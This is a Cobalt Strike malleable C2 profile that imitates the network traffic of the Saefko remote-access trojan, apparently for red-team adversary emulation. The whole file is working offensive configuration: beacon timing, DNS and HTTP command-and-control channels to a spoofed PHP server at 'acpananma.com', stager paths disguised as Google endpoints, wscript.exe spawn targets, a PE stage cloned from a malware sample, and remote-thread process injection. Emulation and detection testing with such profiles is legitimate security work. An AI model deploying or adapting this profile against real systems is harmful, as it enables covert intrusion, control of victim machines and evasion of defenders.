#saefko.profile
#https://www.zscaler.com/blogs/research/saefko-new-multi-layered-rat
#xx0hcd

###global options###
set sleeptime "5000";
set jitter    "33";
set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/587.38";

set sample_name "saefko.profile";

dns-beacon {
    # Options moved into 'dns-beacon' group in 4.3:
    set dns_idle             "8.8.8.8";
    set dns_max_txt          "220";
    set dns_sleep            "0";
    set dns_ttl              "1";
    set maxdns               "255";
    set dns_stager_prepend   ".wwwds.";
    set dns_stager_subhost   ".e2867.dsca.";
     
    # DNS subhost override options added in 4.3:
    set beacon               "d-bx.";
    set get_A                "d-1ax.";
    set get_AAAA             "d-4ax.";
    set get_TXT              "d-1tx.";
    set put_metadata         "d-1mx";
    set put_output           "d-1ox.";
    set ns_response          "zero";
}

http-get {

    set uri "/love/server.php";

    set verb "GET";
    
    client {

        header "Host" "acpananma.com";

	   
        metadata {
            base64url;
            parameter "pass";
        }

        parameter "command" "UpdateHTTPIRCStatus";
        parameter "machine_id" "202";
        parameter "irc_status" "1";

    }

    server {
        header "Server" "Apache";
        header "X-Powered-By" "PHP/5.6.36";
        header "Vary" "Accept-Encoding";
        header "Content-Type" "text/html; charset=UTF-8";
        
        output {

            netbios;
            	     
	    prepend "ok\n";
        prepend "2\n";

	    append "0\n";

            print;
        }
    }
}

http-post {
    
    set uri "/Love/server.php";
    #set verb "GET";
    set verb "POST";

    client {

    header "Content-Type" "application/x-www-form-urlencoded";
	header "Host" "acpananma.com";
    header "Expect" "100-continue";
	header "Connection" "Keep-Alive";
         
        
        output {
            base64url;
            parameter "command";

        }

        id {
	        base64url;
	        parameter "pass";
          
        }

    }

    server {
        header "Host" "acpananma.com";

        output {
            netbios;	    
	   
	    prepend "\nHTTP/1.1 100 Continue\n\n";

        #checked to make sure the misspells were misspelled, uh, correctly?
        append "irc_channel\":\"null\",\"irc_nickname\":\"jI87fg\",\"irc_password\":\"K8gtr$4\",\"irc_port\":\"6669\",\"irc_server\":\"Setting+up+IRC+service.\",\"machine_active_time\":\"12\",\"machine_artct\":\"x86\",\"machine_bitcoin_value\":\"0\",\"machine_business_value\":\"0\",\"machine_calls_activity\":\"0\",\"machine_camera_activity\":\"8\",\"machine_country_iso_code\":\"8864\",\"machine_creadit_card_posiblty\":\"0\",\"machine_current_time\":\"10:32:45\",\"machine_facebook_activity\":\"0\",\"machine_gaming_value\":\"0\",\"machine_gmail_avtivity\":\"0\",\"machine_googlepluse_activity\":\"0\",\"machine_instgram_activity\":\"0\",\"machine_ip\":\"10.1.23.146\",\"machine_lat\":\"0\",\"machine_lng\":\"eng\",\"machine_os_type\":\"win\",\"machine_register_date\":\"0222\",\"machine_screenshot\":\"1";
            print;
        }
    }
}

http-stager {

    set uri_x86 "/clients2.google.com/generate_204";
    set uri_x64 "/clients3.google.com/generate_204";

    client {

        header "Host" "acpananma.com";

    }

    server {
        header "Server" "Apache";
        header "X-Powered-By" "PHP/5.6.36";
        header "Vary" "Accept-Encoding";
        header "Content-Type" "text/html; charset=UTF-8";
    
        output{
            prepend "ok\n";
            prepend "2\n";

	        append "0\n";
            print;
        }

    }


}




###Malleable PE Options###

post-ex {

    set spawnto_x86 "%windir%\\syswow64\\wscript.exe";
    set spawnto_x64 "%windir%\\sysnative\\wscript.exe";

    set obfuscate "false";

    set smartinject "false";

    set amsi_disable "false";

}

#used peclone on sample from https://app.any.run/tasks/54fe7d78-91d9-4d45-8b65-7333c2c7d480/
stage {
    set checksum        "0";
    set compile_time    "12 Feb 2019 14:33:03";
    set entry_point     "159022";
    set image_size_x86  "548864";
    set image_size_x64  "548864";
    #set name	        "";
    set userwx 	        "false";
    set cleanup	        "false";
    set stomppe         "false";
    set obfuscate       "false";
    set rich_header     "";
    
    set sleep_mask "false";

#    set module_x86 "";
#    set module_x64 "";

    transform-x86 {
#        prepend "\x90\x90\x90";
#        strrep "ReflectiveLoader" "6ayBRVW";
#        strrep "beacon.dll" "uVRWRut";
        }

    transform-x64 {
#        prepend "\x90\x90\x90";
#        strrep "ReflectiveLoader" "6ayBRVW";
#        strrep "beacon.x64.dll" "uVRWRut";
        }

#can set a string in the .rdata section of the beacon dll.
    #adds a zero-terminated string
    #string "something";

    #adds a string 'as-is'
    #data "something";

    #adds a wide (UTF-16LE encoded) string
    #stringw "IMAGE_SCN_MEM_READ"; 
}


#controls process injection behavior
process-inject {

#    set allocator "NtMapViewOfSection";		

#    set min_alloc "16700";

    set userwx "false";  
    
    set startrwx "true";
        
    transform-x86 {
#        prepend "\x90\x90\x90";
    }
    transform-x64 {
#        prepend "\x90\x90\x90";
    }

    execute {
#        CreateThread "ntdll!RtlUserThreadStart";
        CreateThread;
        NtQueueApcThread;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}    
